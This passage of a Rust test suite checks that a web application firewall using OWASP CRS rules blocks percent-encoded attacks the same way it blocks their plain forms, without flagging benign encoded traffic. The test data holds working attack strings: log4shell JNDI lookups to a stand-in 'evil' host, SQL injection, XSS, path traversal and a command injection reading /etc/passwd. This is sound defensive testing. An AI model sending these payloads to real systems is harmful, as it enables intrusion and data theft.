            ("host", "shop.example.com"),
        ];

        &[
            Probe {
                label: "browser page view",
                method: "GET",
                path: "/products/shoes",
                query: "",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "urlencoded form POST (CJK, space, ampersand)",
                method: "POST",
                path: "/account/profile",
                query: "",
                body: "name=%E5%BC%A0%E4%B8%89&note=hello+world+%26+co&city=%E5%8C%97%E4%BA%AC",
                headers: FORM_POST,
            },
            Probe {
                label: "JSON body with escapes and a percent sign",
                method: "POST",
                path: "/api/v1/orders",
                query: "",
                body: r#"{"note":"line1\nline2 \"quoted\" 50%","pct":"100%"}"#,
                headers: JSON_POST,
            },
            Probe {
                label: "encoded redirect_uri in the query",
                method: "GET",
                path: "/oauth/callback",
                query: "redirect=https%3A%2F%2Fexample.com%2Fpath%3Fa%3D1%26b%3D2&state=xyz",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "escaped percent sign (q=100%25)",
                method: "GET",
                path: "/search",
                query: "q=100%25&sort=price",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "bare, malformed percent (discount=50%)",
                method: "GET",
                path: "/deals",
                query: "discount=50%",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "encoded Referer and Cookie",
                method: "GET",
                path: "/cart",
                query: "",
                body: "",
                headers: REFERER_AND_COOKIE,
            },
            Probe {
                label: "multipart upload",
                method: "POST",
                path: "/upload",
                query: "",
                body: "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; \
                        name=\"file\"; filename=\"report 2026.pdf\"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4 \
                        hello\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n",
                headers: MULTIPART,
            },
            Probe {
                label: "path with %20 and +",
                method: "GET",
                path: "/files/report%202026%20final+v2.pdf",
                query: "",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "path with an escaped hash",
                method: "GET",
                path: "/docs/chapter%231.html",
                query: "",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "encoded array indices in the query",
                method: "GET",
                path: "/api/items",
                query: "filter%5B0%5D%5Bfield%5D=name&filter%5B0%5D%5Bop%5D=eq",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "encoded array index in the Referer",
                method: "GET",
                path: "/p/1",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("referer", "https://shop.example.com/list/tags%5B0%5D/page%202"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "search phrase using + as a space",
                method: "GET",
                path: "/search",
                query: "q=how+to+select+from+a+menu",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "plus-addressed email in a form POST",
                method: "POST",
                path: "/subscribe",
                query: "",
                body: "email=user%2Btag%40example.com&msg=A%20%26%20B%20%3C%20C",
                headers: FORM_POST,
            },
            Probe {
                label: "ordinary cookies including a bare 1",
                method: "GET",
                path: "/",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("cookie", "consent=1; sid=abc"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "ranged PDF download",
                method: "GET",
                path: "/files/manual.pdf",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("range", "bytes=0-1023"),
                    ("host", "shop.example.com"),
                ],
            },
        ]
    }

    /// Attacks in both their plain and their percent-encoded spelling.  Before
    /// surface-scoped decoding the encoded column was a clean bypass of the 200+
    /// `regex` conditions the shipped CRS set is almost entirely made of.
    fn attack_probes() -> &'static [(Probe, Option<&'static str>)] {
        // Pinned rule ids only where the encoded form used to slip through
        // entirely; elsewhere any block is enough, because which rule wins
        // depends on file order.
        &[
            (
                Probe {
                    label: "log4shell, encoded",
                    method: "GET",
                    path: "/",
                    query: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-944150"),
            ),
            (
                Probe {
                    label: "log4shell, plain",
                    method: "GET",
                    path: "/",
                    query: "x=${jndi:ldap://evil/a}",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-944150"),
            ),
            (
                Probe {
                    label: "log4shell, double-encoded",
                    method: "GET",
                    path: "/",
                    query: "x=%2524%257Bjndi%253Aldap%253A%252F%252Fevil%252Fa%257D",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-944150"),
            ),
            (
                Probe {
                    label: "PHP stream wrapper, encoded",
                    method: "GET",
                    path: "/index.php",
                    query: "page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-933140"),
            ),
            (
                Probe {
                    label: "PHP stream wrapper, plain",
                    method: "GET",
                    path: "/index.php",
                    query: "page=php://filter/convert.base64-encode/resource=index",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-933140"),
            ),
            (
                Probe {
                    label: "SQLi, encoded",
                    method: "GET",
                    path: "/item",
                    query: "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "SQLi, plain",
                    method: "GET",
                    path: "/item",
                    query: "id=1' UNION SELECT username,password FROM users--",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "SQLi in an encoded form body",
                    method: "POST",
                    path: "/login",
                    query: "",
                    body: "user=admin%27%20OR%20%271%27%3D%271&pass=x",
                    headers: FORM_POST,
                },
                None,
            ),
            (
                Probe {
                    label: "XSS, encoded",
                    method: "GET",
                    path: "/",
                    query: "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "XSS, plain",
                    method: "GET",
                    path: "/",
                    query: "q=<script>alert(1)</script>",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "XSS in an encoded cookie",
                    method: "GET",
                    path: "/",
                    query: "",
                    body: "",
                    headers: &[
                        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                        ("cookie", "theme=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
                        ("host", "shop.example.com"),
                    ],
                },
                None,
            ),
            (
                Probe {
                    label: "traversal, encoded path",
                    method: "GET",
                    path: "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    query: "",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "traversal, plain path",
                    method: "GET",
                    path: "/static/../../etc/passwd",
                    query: "",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "traversal, encoded query",
                    method: "GET",
                    path: "/download",
                    query: "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "shell command, encoded",
                    method: "GET",
                    path: "/ping",
                    query: "host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "shell command, plain",
                    method: "GET",
                    path: "/ping",
                    query: "host=127.0.0.1;cat /etc/passwd",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
        ]
    }

    /// Every attack shape is blocked in *both* spellings.  The encoded column
    /// is the regression: `${jndi:` written `%24%7Bjndi%3A` reached the origin
    /// untouched while the identical plain payload was a 403.
    #[test]
    fn percent_encoded_attacks_are_blocked_like_their_plain_form() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        for (probe, pinned) in attack_probes() {
            let hit = verdict(&checker, probe, 1);
            assert!(hit.is_some(), "attack probe not blocked at paranoia 1: {}", probe.label);
            if let Some(expected) = pinned {
                assert_eq!(hit.as_deref(), Some(*expected), "wrong rule fired for {}", probe.label);
            }
        }
    }

    /// The other half of the same change: nothing ordinary started blocking.
    /// Every one of these carries a `%` or a `+` that a naive decode could turn
    /// into an attack-looking string.
    #[test]
    fn ordinary_traffic_carrying_percent_encoding_is_not_blocked() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        for probe in benign_probes() {
            assert_eq!(
                verdict(&checker, probe, 1),
                None,
                "false positive at the default paranoia level: {}",
                probe.label
            );
        }
    }

    /// Paranoia 2 is not the default and is not clean, but its verdicts are
    /// pinned so decoding work cannot quietly add to the list.
    ///
    /// Each entry below is a *pre-existing* converter defect unrelated to
    /// decoding — CRS-920230 is `@rx %[0-9a-fA-F]{2}` (upstream: "an escape
    /// survived `t:urlDecodeUni`", i.e. double encoding) evaluated against the
    /// raw query, and the rest are rules upstream scopes to a single `ARGS`
    /// member that this engine can only run against a whole surface.
    #[test]
    fn paranoia_2_false_positives_stay_at_the_recorded_baseline() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let expected: &[(&str, Option<&str>)] = &[
            ("JSON body with escapes and a percent sign", Some("CRS-932240")),
            ("encoded redirect_uri in the query", Some("CRS-920230")),
            ("escaped percent sign (q=100%25)", Some("CRS-920230")),
            ("multipart upload", Some("CRS-942180")),
            ("encoded array indices in the query", Some("CRS-920230")),
            ("search phrase using + as a space", Some("CRS-942200")),
        ];
        for probe in benign_probes() {
            let want = expected
                .iter()
                .find(|(label, _)| *label == probe.label)
                .and_then(|(_, id)| *id);
            assert_eq!(
                verdict(&checker, probe, 2).as_deref(),
                want,
                "paranoia 2 verdict changed for {}",
                probe.label
            );
        }
    }

    /// `contains` is the one pattern operator deliberately left raw.
    ///
    /// CRS-920610 reads `REQUEST_URI_RAW` and fires on a literal `#` in the
    /// URI; the whole point is that a *properly escaped* `%23` is fine.
    /// Decoding this operator would turn every URL carrying an escaped hash
    /// into a paranoia-1 block.
    #[test]
    fn contains_stays_raw_so_an_escaped_hash_is_not_a_raw_fragment() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let probe = |path: &'static str| Probe {
            label: "hash",
            method: "GET",
            path,
            query: "",
            body: "",
            headers: BROWSER,
        };
        assert_eq!(
            verdict(&checker, &probe("/docs/chapter%231.html"), 1),
            None,
            "an escaped hash is a legal URI, not a raw fragment"
        );
        assert_eq!(
            verdict(&checker, &probe("/docs/chapter#1.html"), 1).as_deref(),
            Some("CRS-920610"),
            "a raw fragment must still be caught"
        );
    }

    /// Header surfaces are matched verbatim, as upstream does.
    ///
    /// CRS-932131 hunts the shell construct `/name[index]` in `User-Agent` /
    /// `Referer`.  Any ordinary Referer holding `%5B0%5D` decodes into exactly
    /// that, so decoding the header would block it — while the plain payload
    /// the rule actually exists for still has to be caught.
    #[test]
    fn header_surfaces_are_matched_verbatim() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let with_referer = |referer: &'static str| Probe {
            label: "referer",
            method: "GET",
            path: "/p/1",
            query: "",
            body: "",
            headers: match referer {
                "escaped" => &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("referer", "https://shop.example.com/list/tags%5B0%5D/page%202"),
                    ("host", "shop.example.com"),
                ],
                _ => &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("referer", "https://shop.example.com/list/tags[0]/page 2"),
                    ("host", "shop.example.com"),
                ],
            },
        };
        assert_eq!(
            verdict(&checker, &with_referer("escaped"), 2),
            None,
            "an escaped Referer must not be decoded into a shell expression"
        );
        assert_eq!(
            verdict(&checker, &with_referer("raw"), 2).as_deref(),
            Some("CRS-932131"),
            "the raw shell expression must still be caught"
        );
    }

    /// `ModSecurity` `MATCHED_VARS` and `TX:N` hold the *transformed* value, so
    /// a chain link and a capture must both see the text the head actually
    /// matched — the decoded form, not the bytes off the wire.
    #[test]
    fn chain_links_and_captures_see_the_decoded_text() {
        let capture_rule = "version: \"1.0\"\nrules:\n  - id: TEST-DECODED-CAPTURE\n    name: t\n    \
             category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
             operator: regex\n    value: 'alpha (\\w+)'\n    capture: true\n    chain:\n      \
             - field: tx:1\n        operator: equals\n        value: beta\n    action: block\n";
        let checker = OWASPCheck::from_yaml(capture_rule);
        assert_eq!(checker.rule_count(), 1);
        // `q=alpha beta`, percent-encoded. A capture taken from the raw query
        // would not exist at all, because the pattern does not match it.
        assert!(
            checker
                .check(&make_ctx_with_query("q=%61%6c%70%68%61%20beta"))
                .is_some(),
            "tx:1 must carry the capture from the decoded value"
        );

        let matched_rule = "version: \"1.0\"\nrules:\n  - id: TEST-DECODED-MATCHED\n    name: t\n    \
             category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
             operator: regex\n    value: alpha\n    chain:\n      - field: matched_value\n        \
             operator: regex\n        value: '^q=alpha beta$'\n    action: block\n";
        let chained = OWASPCheck::from_yaml(matched_rule);
        assert_eq!(chained.rule_count(), 1);
        assert!(
            chained
                .check(&make_ctx_with_query("q=%61%6c%70%68%61%20beta"))
                .is_some(),
            "matched_value must carry the decoded text the head matched"
        );
    }

    /// The allow-list and numeric operators ignore encoding on purpose: a
    /// method token cannot legally carry `%`, `content_length` is an integer
    /// the engine itself renders, and decoding either could only widen what a
    /// deny-by-default comparison rejects.
    #[test]
    fn allowlist_and_numeric_operators_ignore_encoding() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        assert!(
            checker.check(&make_ctx("GET", "/", 0)).is_none(),
            "an allowed method stays allowed"
        );
        for spelled in ["FOOBAR", "%47%45%54", "GET%00"] {
            assert!(
                checker.check(&make_ctx(spelled, "/", 0)).is_some(),
                "{spelled} is not in the CRS-911100 allow-list and must be blocked"
            );
        }
        // CRS-920160: content_length over 10 MB. The value is `u64`-rendered,
        // so there is nothing to decode either way.
        assert!(checker.check(&make_ctx("GET", "/", 10_485_761)).is_some());
        assert!(checker.check(&make_ctx("GET", "/", 1024)).is_none());
    }

    /// The word-at-a-time encoded-ness guard must agree with a plain byte scan
    /// for every input — it decides whether a value is decoded at all, so a
    /// false negative is a silent bypass.
    #[test]
    fn may_be_encoded_word_scan_agrees_with_a_byte_scan() {
        fn naive(s: &str) -> bool {
            s.bytes().any(|b| b == b'%' || b == b'+')
        }
        let mut cases: Vec<String> = vec![
            String::new(),
            "%".into(),
            "+".into(),
            "中文参数值没有转义".into(),
            "\u{0}\u{1}\u{7f}\u{80}".into(),
        ];
        // A marker at every offset of every length across the 8-byte word
        // boundary, plus the all-clear strings of the same lengths.
        for len in 0..40usize {
            let clear = "a".repeat(len);
            cases.push(clear.clone());
            for pos in 0..len {
                for marker in ['%', '+'] {
                    let mut s: Vec<char> = clear.chars().collect();
                    if let Some(slot) = s.get_mut(pos) {
                        *slot = marker;
                    }
                    cases.push(s.into_iter().collect());
                }
            }
            // High-bit bytes stress the borrow trick's `& !word` term.
            cases.push("\u{ff}".repeat(len));
            cases.push(format!("{}%", "\u{80}".repeat(len)));
        }
        for case in &cases {
            assert_eq!(
                may_be_encoded(case),
                naive(case),
                "word scan disagrees for {case:?} (len {})",
                case.len()
            );
        }
    }
}
